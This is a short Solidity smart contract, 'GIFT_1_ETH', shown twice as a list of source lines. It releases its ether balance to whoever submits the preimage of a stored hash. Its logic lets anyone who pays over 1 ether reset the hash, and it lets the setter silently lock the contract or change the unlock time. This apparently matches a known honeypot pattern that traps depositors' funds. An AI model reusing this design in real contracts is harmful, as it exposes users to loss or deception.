['pragma solidity ^0.4.19;\n', '\n', 'contract GIFT_1_ETH\n', '{\n', '    bytes32 public hashPass;\n', '    \n', '    bool closed = false;\n', '    \n', '    address sender;\n', ' \n', '    uint unlockTime;\n', ' \n', '    function() public payable{}\n', '    \n', '    function GetHash(bytes pass) public constant returns (bytes32) {return keccak256(pass);}\n', '    \n', '    function SetPass(bytes32 hash)\n', '    public\n', '    payable\n', '    {\n', '        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x0 )\n', '        {\n', '            hashPass = hash;\n', '            sender = msg.sender;\n', '            unlockTime = now;\n', '        }\n', '    }\n', '    \n', '    function SetGiftTime(uint date)\n', '    public\n', '    {\n', '        if(msg.sender==sender)\n', '        {\n', '            unlockTime = date;\n', '        }\n', '    }\n', '    \n', '    function GetGift(bytes pass)\n', '    external\n', '    payable\n', '    canOpen\n', '    {\n', '        if(hashPass == keccak256(pass))\n', '        {\n', '            msg.sender.transfer(this.balance);\n', '        }\n', '    }\n', '    \n', '    function Revoce()\n', '    public\n', '    payable\n', '    canOpen\n', '    {\n', '        if(msg.sender==sender)\n', '        {\n', '            sender.transfer(this.balance);\n', '        }\n', '    }\n', '    \n', '    function PassHasBeenSet(bytes32 hash)\n', '    public\n', '    {\n', '        if(msg.sender==sender&&hash==hashPass)\n', '        {\n', '           closed=true;\n', '        }\n', '    }\n', '    \n', '    modifier canOpen\n', '    {\n', '        require(now>unlockTime);\n', '        _;\n', '    }\n', '    \n', '}']
['pragma solidity ^0.4.19;\n', '\n', 'contract GIFT_1_ETH\n', '{\n', '    bytes32 public hashPass;\n', '    \n', '    bool closed = false;\n', '    \n', '    address sender;\n', ' \n', '    uint unlockTime;\n', ' \n', '    function() public payable{}\n', '    \n', '    function GetHash(bytes pass) public constant returns (bytes32) {return keccak256(pass);}\n', '    \n', '    function SetPass(bytes32 hash)\n', '    public\n', '    payable\n', '    {\n', '        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x0 )\n', '        {\n', '            hashPass = hash;\n', '            sender = msg.sender;\n', '            unlockTime = now;\n', '        }\n', '    }\n', '    \n', '    function SetGiftTime(uint date)\n', '    public\n', '    {\n', '        if(msg.sender==sender)\n', '        {\n', '            unlockTime = date;\n', '        }\n', '    }\n', '    \n', '    function GetGift(bytes pass)\n', '    external\n', '    payable\n', '    canOpen\n', '    {\n', '        if(hashPass == keccak256(pass))\n', '        {\n', '            msg.sender.transfer(this.balance);\n', '        }\n', '    }\n', '    \n', '    function Revoce()\n', '    public\n', '    payable\n', '    canOpen\n', '    {\n', '        if(msg.sender==sender)\n', '        {\n', '            sender.transfer(this.balance);\n', '        }\n', '    }\n', '    \n', '    function PassHasBeenSet(bytes32 hash)\n', '    public\n', '    {\n', '        if(msg.sender==sender&&hash==hashPass)\n', '        {\n', '           closed=true;\n', '        }\n', '    }\n', '    \n', '    modifier canOpen\n', '    {\n', '        require(now>unlockTime);\n', '        _;\n', '    }\n', '    \n', '}']
